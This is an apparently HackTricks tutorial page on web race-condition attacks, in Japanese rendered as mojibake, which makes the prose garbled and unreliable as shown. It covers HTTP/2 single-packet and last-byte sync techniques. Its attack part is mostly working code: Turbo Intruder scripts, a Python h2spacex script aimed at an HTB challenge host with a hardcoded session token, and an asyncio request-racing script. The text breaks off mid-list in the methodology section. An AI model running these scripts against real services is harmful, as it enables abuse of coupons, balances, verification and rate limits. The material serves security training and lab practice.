# ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚å…ˆé€²çš„ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰**ãŠã‚ˆã³**è‡ªå‹•åŒ–**ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ãã ã•ã„ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼**ã—ãŸã„å ´åˆã‚„**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

{% hint style="warning" %}
ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã®æ·±ã„ç†è§£ã‚’å¾—ã‚‹ã«ã¯ã€[https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)ã®å…ƒã®ãƒ¬ãƒãƒ¼ãƒˆã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

## ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³æ”»æ’ƒã®å¼·åŒ–

ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã‚’åˆ©ç”¨ã™ã‚‹éš›ã®ä¸»ãªéšœå®³ã¯ã€**è¤‡æ•°ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒåŒæ™‚ã«å‡¦ç†ã•ã‚Œã€å‡¦ç†æ™‚é–“ã«éå¸¸ã«å°‘ãªã„å·®ãŒã‚ã‚‹ã“ã¨**ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã§ã™ã€‚ç†æƒ³çš„ã«ã¯ã€1msæœªæº€ã§ã™ã€‚

ã“ã“ã§ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®åŒæœŸã®ãŸã‚ã®ã„ãã¤ã‹ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

#### HTTP/2ã‚·ãƒ³ã‚°ãƒ«ãƒ‘ã‚±ãƒƒãƒˆæ”»æ’ƒ vs. HTTP/1.1ãƒ©ã‚¹ãƒˆãƒã‚¤ãƒˆåŒæœŸ

* **HTTP/2**ï¼š1ã¤ã®TCPæ¥ç¶šã§2ã¤ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã§ãã‚‹ãŸã‚ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®æºã‚Œã®å½±éŸ¿ã‚’è»½æ¸›ã—ã¾ã™ã€‚ãŸã ã—ã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã®å¤‰å‹•ã«ã‚ˆã‚Šã€2ã¤ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã¯ä¸€è²«ã—ãŸãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã®æ”»æ’ƒãŒã§ããªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚
* **HTTP/1.1 'ãƒ©ã‚¹ãƒˆãƒã‚¤ãƒˆåŒæœŸ'**ï¼š20ã€œ30ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ã»ã¨ã‚“ã©ã®éƒ¨åˆ†ã‚’äº‹å‰ã«é€ä¿¡ã—ã€å°ã•ãªæ–­ç‰‡ã‚’ä¿ç•™ã—ã¦ã‹ã‚‰ä¸€ç·’ã«é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€ã‚µãƒ¼ãƒãƒ¼ã¸ã®åŒæ™‚åˆ°ç€ã‚’å®Ÿç¾ã—ã¾ã™ã€‚

**ãƒ©ã‚¹ãƒˆãƒã‚¤ãƒˆåŒæœŸã®æº–å‚™**ã«ã¯æ¬¡ã®æ‰‹é †ãŒå«ã¾ã‚Œã¾ã™ï¼š

1. ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’çµ‚äº†ã›ãšã«ã€æœ€çµ‚ãƒã‚¤ãƒˆã‚’é™¤ã„ãŸãƒ˜ãƒƒãƒ€ãƒ¼ã¨æœ¬ä½“ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã—ã¾ã™ã€‚
2. åˆæœŸé€ä¿¡å¾Œã«100mså¾…æ©Ÿã—ã¾ã™ã€‚
3. æœ€çµ‚ãƒ•ãƒ¬ãƒ¼ãƒ ã‚’ãƒãƒƒãƒå‡¦ç†ã™ã‚‹ãŸã‚ã«TCP\_NODELAYã‚’ç„¡åŠ¹ã«ã—ã¾ã™ã€‚
4. æ¥ç¶šã‚’ã‚¦ã‚©ãƒ¼ãƒ ã‚¢ãƒƒãƒ—ã™ã‚‹ãŸã‚ã«ãƒ”ãƒ³ãƒãƒ³ã‚’è¡Œã„ã¾ã™ã€‚

ä¿ç•™ã•ã‚ŒãŸãƒ•ãƒ¬ãƒ¼ãƒ ã®å¾Œç¶šã®é€ä¿¡ã¯ã€Wiresharkã‚’ä½¿ç”¨ã—ã¦å˜ä¸€ã®ãƒ‘ã‚±ãƒƒãƒˆã§ã®åˆ°ç€ã‚’ç¢ºèªã™ã‚‹ã¯ãšã§ã™ã€‚ã“ã®æ–¹æ³•ã¯ã€é€šå¸¸ã¯RCæ”»æ’ƒã«é–¢ä¸ã—ãªã„é™çš„ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯é©ç”¨ã•ã‚Œã¾ã›ã‚“ã€‚

### ã‚µãƒ¼ãƒãƒ¼ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã¸ã®é©å¿œ

ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã‚’ç†è§£ã™ã‚‹ã“ã¨ã¯é‡è¦ã§ã™ã€‚ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã‚µãƒ¼ãƒãƒ¼ã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°æ–¹æ³•ã‚’ç•°ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚å–ã‚‹ã¹ãäºˆé˜²æªç½®ã¨ã—ã¦ã€ç„¡é–¢ä¿‚ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä»‹ã—ã¦äº‹å‰ã«ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã®æ¥ç¶šã‚’ã‚¦ã‚©ãƒ¼ãƒ ã‚¢ãƒƒãƒ—ã™ã‚‹ã“ã¨ã§ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã‚’æ­£å¸¸åŒ–ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

#### ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒ™ãƒ¼ã‚¹ã®ãƒ­ãƒƒã‚¯ã®å‡¦ç†

PHPã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒãƒ³ãƒ‰ãƒ©ã®ã‚ˆã†ãªãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ã”ã¨ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ç›´åˆ—åŒ–ã™ã‚‹ãŸã‚ã€è„†å¼±æ€§ã‚’éš ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚å„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ç•°ãªã‚‹ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ã“ã®å•é¡Œã‚’å›é¿ã§ãã¾ã™ã€‚

#### ãƒ¬ãƒ¼ãƒˆã¾ãŸã¯ãƒªã‚½ãƒ¼ã‚¹åˆ¶é™ã®å…‹æœ

æ¥ç¶šã®ã‚¦ã‚©ãƒ¼ãƒ ã‚¢ãƒƒãƒ—ãŒåŠ¹æœãŒãªã„å ´åˆã€ãƒ€ãƒŸãƒ¼ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®æ´ªæ°´ã‚’é€šã˜ã¦æ„å›³çš„ã«Webã‚µãƒ¼ãƒãƒ¼ã®ãƒ¬ãƒ¼ãƒˆã¾ãŸã¯ãƒªã‚½ãƒ¼ã‚¹åˆ¶é™ã®é…å»¶ã‚’å¼•ãèµ·ã“ã™ã“ã¨ã§ã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã®é…å»¶ã‚’èª˜ç™ºã—ã€ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã«é©ã—ãŸé…å»¶ã‚’ã‚‚ãŸã‚‰ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

## æ”»æ’ƒä¾‹

* **Tubo Intruder - HTTP2ã‚·ãƒ³ã‚°ãƒ«ãƒ‘ã‚±ãƒƒãƒˆæ”»æ’ƒï¼ˆ1ã¤ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆï¼‰**ï¼šãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’**Turbo Intruder**ã«é€ä¿¡ã§ãã¾ã™ï¼ˆ`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`ï¼‰ã€`csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`ã®ã‚ˆã†ã«**`%s`**ã§ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ãŸã„å€¤ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã§å¤‰æ›´ã—ã€ãƒ‰ãƒ­ãƒƒãƒ—ãƒ€ã‚¦ãƒ³ã‹ã‚‰**`examples/race-single-packer-attack.py`**ã‚’é¸æŠã§ãã¾ã™ï¼š

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

**ç•°ãªã‚‹å€¤ã‚’é€ä¿¡**ã™ã‚‹å ´åˆã¯ã€ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã‹ã‚‰ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã“ã®ã‚³ãƒ¼ãƒ‰ã«å¤‰æ›´ã§ãã¾ã™ï¼š
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
ã‚¦ã‚§ãƒ–ãŒHTTP2ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ãªã„å ´åˆï¼ˆHTTP1.1ã®ã¿ï¼‰ã€`Engine.BURP2`ã®ä»£ã‚ã‚Šã«`Engine.THREADED`ã¾ãŸã¯`Engine.BURP`ã‚’ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

* **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: RCEã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ãŸã‚ã«1ã¤ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€ãã®å¾Œä»–ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«è¤‡æ•°ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã€`race-single-packet-attack.py`ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä»¥ä¸‹ã®ã‚ˆã†ã«å¤‰æ›´ã§ãã¾ã™ï¼š
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* **Repeater**ã§ã‚‚ã€Burp Suiteã®æ–°ã—ã„ '**Send group in parallel**' ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚
* **limit-overrun**ã®å ´åˆã€**åŒã˜ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’50å›**ã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã™ã‚‹ã ã‘ã§ã™ã€‚
* **æ¥ç¶šã‚¦ã‚©ãƒ¼ãƒŸãƒ³ã‚°**ã®ãŸã‚ã«ã¯ã€Webã‚µãƒ¼ãƒãƒ¼ã®éé™çš„éƒ¨åˆ†ã«ã„ãã¤ã‹ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’**ã‚°ãƒ«ãƒ¼ãƒ—ã®æœ€åˆã«è¿½åŠ **ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* 1ã¤ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å‡¦ç†ã—ã¦ã‹ã‚‰ã‚‚ã†1ã¤ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å‡¦ç†ã™ã‚‹ã¾ã§ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’**é…å»¶ã•ã›ã‚‹**ã«ã¯ã€ä¸¡æ–¹ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®é–“ã«**è¿½åŠ ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¿½åŠ **ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **è¤‡æ•°ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ**ã®RCã®å ´åˆã€**éš ã‚ŒãŸçŠ¶æ…‹ã«ç§»å‹•ã™ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã‚’é€ä¿¡ã—ã€ãã®å¾Œã™ãã«**éš ã‚ŒãŸçŠ¶æ…‹ã‚’æ‚ªç”¨ã™ã‚‹50ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã‚’é€ä¿¡ã—ã¾ã™ã€‚

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **è‡ªå‹•åŒ–ã•ã‚ŒãŸPythonã‚¹ã‚¯ãƒªãƒ—ãƒˆ**: ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ç›®çš„ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å¤‰æ›´ã—ç¶šã‘ãªãŒã‚‰ã€æ–°ã—ã„ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã®æ¤œè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ãŒæœ€å¾Œã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã«åˆ°ç€ã™ã‚‹ã¾ã§ç¶™ç¶šçš„ã«æ¤œè¨¼ã™ã‚‹ã“ã¨ã§ã™ï¼ˆã“ã‚Œã¯ã€ã‚³ãƒ¼ãƒ‰å†…ã§ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å¤‰æ›´ã§ãã‚‹ãŒã€æœ€åˆã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã§æ¤œè¨¼ãŒé€ä¿¡ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹RCãŒè¦‹ã‚‰ã‚ŒãŸãŸã‚ã§ã™ã€‚ï¼‰ã€‚\
å—ä¿¡ã—ãŸãƒ¡ãƒ¼ãƒ«ã«ã€Œobjetivoã€ã¨ã„ã†å˜èªãŒè¦‹ã¤ã‹ã£ãŸå ´åˆã€å¤‰æ›´ã•ã‚ŒãŸãƒ¡ãƒ¼ãƒ«ã®æ¤œè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å—ä¿¡ã—ãŸã“ã¨ãŒã‚ã‹ã‚Šã€æ”»æ’ƒã‚’çµ‚äº†ã—ã¾ã™ã€‚
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)




# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Raw BF

ä»¥å‰ã®ç ”ç©¶ã®å‰ã«ä½¿ç”¨ã•ã‚ŒãŸã„ãã¤ã‹ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€RCã‚’å¼•ãèµ·ã“ã™ãŸã‚ã«å¯èƒ½ãªé™ã‚Šé€Ÿããƒ‘ã‚±ãƒƒãƒˆã‚’é€ã‚ã†ã¨ã™ã‚‹ã‚‚ã®ã§ã—ãŸã€‚

- **Repeater:** å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‹ã‚‰ã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
- **Intruder**: **Intruder** ã«**ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã‚’é€ä¿¡ã—ã€**ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãƒ¡ãƒ‹ãƒ¥ãƒ¼**å†…ã§**ã‚¹ãƒ¬ãƒƒãƒ‰æ•°**ã‚’**30**ã«è¨­å®šã—ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¨ã—ã¦**Null payloads**ã‚’é¸æŠã—ã¦**30**ã‚’ç”Ÿæˆã—ã¾ã™ã€‚
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

ã“ã‚Œã¯ã€**ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã‚‹å›æ•°ã‚’åˆ¶é™ã™ã‚‹å ´æ‰€**ã«**ç¾ã‚Œã‚‹è„†å¼±æ€§**ã§ã‚ã‚‹æœ€ã‚‚åŸºæœ¬çš„ãªç«¶åˆçŠ¶æ…‹ã®ã‚¿ã‚¤ãƒ—ã§ã™ã€‚ãŸã¨ãˆã°ã€ã‚¦ã‚§ãƒ–ã‚¹ãƒˆã‚¢ã§åŒã˜å‰²å¼•ã‚³ãƒ¼ãƒ‰ã‚’è¤‡æ•°å›ä½¿ç”¨ã™ã‚‹ã“ã¨ãªã©ãŒè©²å½“ã—ã¾ã™ã€‚éå¸¸ã«ç°¡å˜ãªä¾‹ã¯[**ã“ã®ãƒ¬ãƒãƒ¼ãƒˆ**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43)ã‚„[**ã“ã®ãƒã‚°**](https://hackerone.com/reports/759247)ã«è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®ç¨®ã®æ”»æ’ƒã«ã¯ã€æ¬¡ã®ã‚ˆã†ãªå¤šãã®ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™:

* ã‚®ãƒ•ãƒˆã‚«ãƒ¼ãƒ‰ã‚’è¤‡æ•°å›åˆ©ç”¨ã™ã‚‹
* è£½å“ã«è¤‡æ•°å›è©•ä¾¡ã‚’ä»˜ã‘ã‚‹
* å£åº§æ®‹é«˜ã‚’è¶…ãˆã¦ç¾é‡‘ã‚’å¼•ãå‡ºã™ã‹é€é‡‘ã™ã‚‹
* å˜ä¸€ã®CAPTCHAã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å†åˆ©ç”¨ã™ã‚‹
* å¯¾æŠ—ã™ã‚‹ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹

### **Hidden substates**

è¤‡é›‘ãªç«¶åˆçŠ¶æ…‹ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã¯ã€éš ã‚ŒãŸã¾ãŸã¯**æ„å›³ã—ãªã„ãƒã‚·ãƒ³ã®ã‚µãƒ–ã‚¹ãƒ†ãƒ¼ãƒˆ**ã¨ã®çŸ­ã„æ©Ÿä¼šã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã‚’ã—ã°ã—ã°å«ã¿ã¾ã™ã€‚ä»¥ä¸‹ã¯ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒæ–¹æ³•ã§ã™:

1. **æ½œåœ¨çš„ãªéš ã‚ŒãŸã‚µãƒ–ã‚¹ãƒ†ãƒ¼ãƒˆã‚’ç‰¹å®šã™ã‚‹**
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒªã‚»ãƒƒãƒˆãƒ—ãƒ­ã‚»ã‚¹ãªã©ã®é‡è¦ãªãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã¾ãŸã¯æ“ä½œã™ã‚‹ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ç‰¹å®šã™ã‚‹ã“ã¨ã‹ã‚‰å§‹ã‚ã¾ã™ã€‚ä»¥ä¸‹ã«ç„¦ç‚¹ã‚’å½“ã¦ã¾ã™:
